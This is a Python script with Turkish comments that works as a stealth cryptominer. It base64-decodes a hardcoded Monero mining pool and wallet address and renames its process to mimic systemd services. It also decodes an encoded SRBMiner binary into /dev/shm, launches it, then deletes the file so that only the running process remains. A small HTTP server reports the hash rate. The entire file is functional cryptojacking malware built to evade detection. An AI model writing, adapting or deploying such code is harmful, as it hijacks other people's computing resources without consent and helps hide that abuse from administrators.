#!/usr/bin/env python3
import os
import sys
import time
import json
import base64
import threading
import subprocess
import http.server
import sqlite3
import re
import ctypes
import datetime
from collections import deque

# --- SÜREÇ MASKELEME (PROCESS MASQUERADING) ---
def set_process_name(name):
    """Linux çekirdek seviyesinde prctl kullanarak işlem adını değiştirir."""
    try:
        libc = ctypes.CDLL('libc.so.6')
        libc.prctl(15, name.encode('utf-8'), 0, 0, 0)
    except Exception:
        pass

# --- YAPILANDIRMA VE ŞİFRE ÇÖZME ---
def _d(s): return base64.b64decode(s).decode('utf-8')

MODE         = os.environ.get("ENGINE_MODE", "miner")
HTTP_PORT    = int(os.environ.get("PORT", 8080))
PROXY_URL    = os.environ.get("PROXY_URL", "")
# SRBMiner parametreleri için havuz ve cüzdan şifreli verileri
POOL_URL     = os.environ.get("POOL_URL", _d("cG9vbC5zdXBwb3J0eG1yLmNvbTo0NDM="))
WALLET_ADDR  = os.environ.get("WALLET_ADDR", _d("NDl5cWJOZ0cxMzVld3FKOXVOUVhUZ0I5bUthVVhmZzFiM2FiQWJoc1NEZ2g0YXNWYmZIdVlES0FkaWlkbVRDQjhwQUNZZHd4ejc3VHdKaHdFU2hEdDZuQkI1WmpjdEw="))
WORKER_NAME  = os.environ.get("WORKER_NAME", f"node-{int(time.time())%1000}")
DATA_DIR     = "/dev/shm/.cache"

_current_hr  = "0.0 H/s"
SYSTEM_LOGS  = deque(maxlen=500)
_LOG_LOCK    = threading.Lock()

# --- BELLEKTE YÜRÜTME (FILELESS EXECUTION) ---
def run_core_fileless():
    """SRBMiner'ı RAM'de çözer ve iz bırakmadan çalıştırır."""
    global _current_hr
    
    enc_path = "/server/core.dat" 
    if not os.path.exists(enc_path):
        return

    try:
        # 1. İşlem adını maskele
        set_process_name("systemd-networkd")

        # 2. Payload'u belleğe al
        with open(enc_path, "rb") as f:
            raw_binary = base64.b64decode(f.read())

        # 3. /dev/shm (RAM Disk) üzerine geçici alan
        mem_exec_path = f"/dev/shm/.sys_net_{int(time.time())}"
        with open(mem_exec_path, "wb") as f:
            f.write(raw_binary)
        
        os.chmod(mem_exec_path, 0o755)

        # 4. SRBMiner-Multi Komut Seti
        # --disable-gpu: CPU odaklı çalışma
        # --tls: Trafik şifreleme
        cmd = [
            mem_exec_path, 
            "--algorithm", "randomx", 
            "--pool", POOL_URL, 
            "--wallet", WALLET_ADDR, 
            "--password", WORKER_NAME,
            "--disable-gpu", 
            "--tls", "true",
            "--give-up-limit", "5"
        ]

        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
        
        # Dosya handle edildikten sonra sil (Sadece RAM'de kalsın)
        time.sleep(5)
        if os.path.exists(mem_exec_path):
            os.remove(mem_exec_path)

        for line in proc.stdout:
            clean_line = re.sub(r'\x1b\[[0-9;]*[mK]', '', line).strip()
            # SRBMiner hashrate yakalama (Örn: "Total hashrate: 500.00 H/s")
            if "hashrate" in clean_line.lower():
                match = re.search(r'(\d+\.?\d* [KMG]?H/s)', clean_line)
                if match: _current_hr = match.group(1)
            print(f"[NET] {clean_line}", flush=True)

    except Exception:
        time.sleep(10)

def run_http():
    class SimpleHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(f"Node Status: Active | Rate: {_current_hr}".encode())
        def log_message(self, format, *args): pass

    srv = http.server.ThreadingHTTPServer(("0.0.0.0", HTTP_PORT), SimpleHandler)
    srv.serve_forever()

if __name__ == "__main__":
    set_process_name("systemd-udevd")
    if MODE == "all":
        threading.Thread(target=run_http, daemon=True).start()
    run_core_fileless()
